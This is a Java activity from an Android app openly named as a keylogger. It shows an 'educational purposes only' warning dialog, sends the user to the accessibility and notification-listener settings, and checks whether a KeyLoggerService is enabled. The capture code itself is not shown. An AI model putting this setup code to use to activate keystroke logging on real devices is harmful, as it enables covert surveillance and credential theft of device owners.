package com.example.keylogger;

import androidx.appcompat.app.AlertDialog;
import androidx.appcompat.app.AppCompatActivity;

import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.graphics.Color;
import android.os.Bundle;
import android.provider.Settings;
import android.text.TextUtils;
import android.widget.Button;
import android.widget.TextView; 

public class MainActivity extends AppCompatActivity {

    private TextView statusTextView;
    private Button enableButton;
    private Button enableNotificationButton; 

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
       
        showEthicalWarning();
       
        statusTextView = findViewById(R.id.status_text);
        enableButton = findViewById(R.id.enable_button);
        
       
        enableNotificationButton = findViewById(R.id.enable_notification_button); 

      
        enableButton.setOnClickListener(v -> {
            try {
                Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
                startActivity(intent);
            } catch (Exception e) {
                e.printStackTrace();
            }
        });

        enableNotificationButton.setOnClickListener(v -> {
            try {
                Intent intent = new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS");
                startActivity(intent);
            } catch (Exception e) {
                e.printStackTrace();
            }
        });
    }

    @Override
    protected void onResume() {
        super.onResume();
        updateServiceStatus();
        
    }
    
 

    private void updateServiceStatus() {
        if (isAccessibilityServiceEnabled(this, KeyLoggerService.class)) {
            statusTextView.setText("Status: Active");
            statusTextView.setTextColor(Color.GREEN);
        } else {
            statusTextView.setText("Status: Inactive");
            statusTextView.setTextColor(Color.RED);
        }
    }

    public boolean isAccessibilityServiceEnabled(Context context, Class<?> service) {
        TextUtils.SimpleStringSplitter splitter = new TextUtils.SimpleStringSplitter(':');
        String settingValue = Settings.Secure.getString(
                context.getApplicationContext().getContentResolver(),
                Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
        );

        if (settingValue == null) {
            return false;
        }

        splitter.setString(settingValue);
        while (splitter.hasNext()) {
            String componentName = splitter.next();
            if (componentName.equalsIgnoreCase(context.getPackageName() + "/" + service.getName())) {
                return true;
            }
        }
        return false;
    }
   
    private void showEthicalWarning() {
        AlertDialog.Builder builder = new AlertDialog.Builder(this);
        builder.setTitle("🛑 Ethical Warning / नैतिक चेतावनी");
        builder.setMessage("This app is for educational purposes only.\n\n" +
                           "Installing this on a device you do not own is illegal and unethical. " +
                           "Press 'Agree' only if you own this device and are testing for " +
                           "learning purposes.\n\n" +
                           "क्या आप सहमत हैं कि आप इस ऐप का उपयोग केवल शैक्षिक उद्देश्यों के लिए " +
                           "अपने स्वयं के डिवाइस पर कर रहे हैं?");
        builder.setPositiveButton("Agree (मैं सहमत हूँ)", (dialog, which) -> dialog.dismiss());
        builder.setNegativeButton("Disagree (असहमत हूँ)", (dialog, which) -> {
            finish();
        });
        builder.setCancelable(false); 
        builder.show();
    }
}
